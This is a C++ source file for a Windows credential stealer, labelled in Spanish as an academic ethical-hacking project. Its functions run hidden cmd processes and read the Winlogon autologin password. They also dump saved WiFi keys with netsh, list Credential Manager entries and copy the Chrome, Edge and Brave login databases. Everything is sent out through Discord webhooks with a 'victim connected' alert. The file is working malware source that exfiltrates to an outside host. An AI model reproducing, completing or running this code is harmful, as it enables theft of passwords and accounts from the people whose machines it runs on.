// ============================================================
//  credentials.cpp — Recolección de credenciales
//  Proyecto académico - Hacking ético - UPC
// ============================================================
#include "credentials.h"
#include "discord.h"
#include "config.h"
#include <windows.h>
#include <string>
#include <sstream>
#include <vector>
#include <fstream>

#pragma comment(lib, "advapi32.lib")

// ============================================================
//  Ejecutar comando y capturar salida
// ============================================================
static std::string EjecutarComando(const std::string& cmd) {
    std::string resultado;
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    std::string cmd_full = "cmd.exe /c " + cmd;

    if (CreateProcessA(NULL, (LPSTR)cmd_full.c_str(), NULL, NULL,
                       TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);

        char buffer[4096];
        DWORD leidos;
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &leidos, NULL) && leidos > 0) {
            buffer[leidos] = 0;
            resultado += buffer;
        }

        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hRead);
    return resultado;
}

// ============================================================
//  Autologin (registry de Winlogon)
// ============================================================
static std::string ObtenerAutologin() {
    std::stringstream ss;
    ss << "=== AUTOLOGIN ===\n";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        char usuario[256] = {0};
        char password[256] = {0};
        DWORD size = sizeof(usuario);

        if (RegQueryValueExA(hKey, "DefaultUserName", NULL, NULL,
            (LPBYTE)usuario, &size) == ERROR_SUCCESS) {
            ss << "Usuario: " << usuario << "\n";
        }

        size = sizeof(password);
        if (RegQueryValueExA(hKey, "DefaultPassword", NULL, NULL,
            (LPBYTE)password, &size) == ERROR_SUCCESS) {
            ss << "Password: " << password << "\n";
        }

        RegCloseKey(hKey);
    } else {
        ss << "(No se pudo leer)\n";
    }

    return ss.str();
}

// ============================================================
//  WiFi passwords
// ============================================================
static std::string ObtenerWiFi() {
    std::stringstream ss;
    ss << "\n=== WIFI ===\n";

    std::string perfiles = EjecutarComando("netsh wlan show profiles");

    // Extraer nombres de perfiles
    std::vector<std::string> nombres;
    size_t pos = 0;
    while ((pos = perfiles.find(":", pos)) != std::string::npos) {
        size_t fin = perfiles.find("\n", pos);
        std::string linea = perfiles.substr(pos + 1, fin - pos - 1);

        // Limpiar espacios
        size_t inicio = linea.find_first_not_of(" \t");
        if (inicio != std::string::npos) {
            std::string nombre = linea.substr(inicio);
            // Buscar el nombre de la red
            size_t inicio_nombre = nombre.find_last_of(":") == std::string::npos ?
                                   0 : 0;
            if (!nombre.empty() && nombre[0] != '\r') {
                // Quitar \r
                if (!nombre.empty() && nombre.back() == '\r')
                    nombre.pop_back();
                if (nombre.length() > 2)
                    nombres.push_back(nombre);
            }
        }
        pos = fin;
    }

    for (const auto& nombre : nombres) {
        std::string cmd = "netsh wlan show profile name=\"" + nombre + "\" key=clear";
        std::string salida = EjecutarComando(cmd);

        size_t posKey = salida.find("Contenido de la clave");
        if (posKey == std::string::npos) {
            posKey = salida.find("Key Content");
        }

        if (posKey != std::string::npos) {
            size_t inicio = salida.find(":", posKey);
            if (inicio != std::string::npos) {
                size_t fin = salida.find("\n", inicio);
                std::string clave = salida.substr(inicio + 1, fin - inicio - 1);

                // Limpiar
                size_t p = clave.find_first_not_of(" \t");
                if (p != std::string::npos) clave = clave.substr(p);
                if (!clave.empty() && clave.back() == '\r') clave.pop_back();

                ss << nombre << " : " << clave << "\n";
            }
        }
    }

    if (nombres.empty()) ss << "(Sin perfiles WiFi)\n";
    return ss.str();
}

// ============================================================
//  Credential Manager
// ============================================================
static std::string ObtenerCredentialManager() {
    std::stringstream ss;
    ss << "\n=== CREDENTIAL MANAGER ===\n";
    ss << EjecutarComando("cmdkey /list");
    return ss.str();
}

// ============================================================
//  Copiar Login Data de Chrome/Edge (SQLite)
// ============================================================
static void CopiarNavegadores() {
    char userPath[MAX_PATH];
    DWORD size = MAX_PATH;
    GetEnvironmentVariableA("USERPROFILE", userPath, size);

    std::string user(userPath);

    // Rutas de Login Data
    std::vector<std::pair<std::string, std::wstring>> rutas = {
        { user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
          L"Chrome_LoginData.db" },
        { user + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
          L"Edge_LoginData.db" },
        { user + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
          L"Brave_LoginData.db" },
    };

    std::string tempDir = "C:\\ProgramData\\.browsers";
    CreateDirectoryA(tempDir.c_str(), NULL);

    for (auto& par : rutas) {
        std::ifstream f(par.first.c_str());
        if (!f.good()) continue;
        f.close();

        std::string destino = tempDir + "\\" + WideToUtf8(par.second);

        if (CopyFileA(par.first.c_str(), destino.c_str(), FALSE)) {
            std::wstring comentario = L"🌐 **Login Data:** `" + par.second + L"`";
            DiscordEnviarArchivo(WEBHOOK_EXFILTRACION,
                Utf8ToWide(destino), comentario);
            DeleteFileA(destino.c_str());
        }
    }
}

// ============================================================
//  FUNCIÓN PRINCIPAL
// ============================================================
void EnviarCredencialesDiscord() {
    std::wstring hostname_str;
    {
        wchar_t buf[256]; DWORD size = 256;
        GetComputerNameW(buf, &size);
        hostname_str = std::wstring(buf, size);
    }

    std::wstring usuario_str;
    {
        wchar_t buf[256]; DWORD size = 256;
        GetUserNameW(buf, &size);
        usuario_str = std::wstring(buf, size - 1);
    }

    // Mensaje principal (formato bonito como la foto)
    std::stringstream mensaje;
    mensaje << "✅ **Victima conectada:** " << WideToUtf8(usuario_str) << "@"
            << WideToUtf8(hostname_str) << "\n";
    mensaje << "🔑 **Credenciales capturadas:**\n\n";
    mensaje << "```\n";

    mensaje << ObtenerAutologin();
    mensaje << ObtenerWiFi();
    mensaje << "\n=== CHROME / EDGE ===\n";
    mensaje << "(Archivos .db adjuntos)\n";
    mensaje << ObtenerCredentialManager();

    mensaje << "\n========================================\n";
    mensaje << "========================================\n";
    mensaje << "```";

    DiscordEnviarTexto(WEBHOOK_ALERTAS, Utf8ToWide(mensaje.str()));

    // Enviar archivos .db por separado
    CopiarNavegadores();
}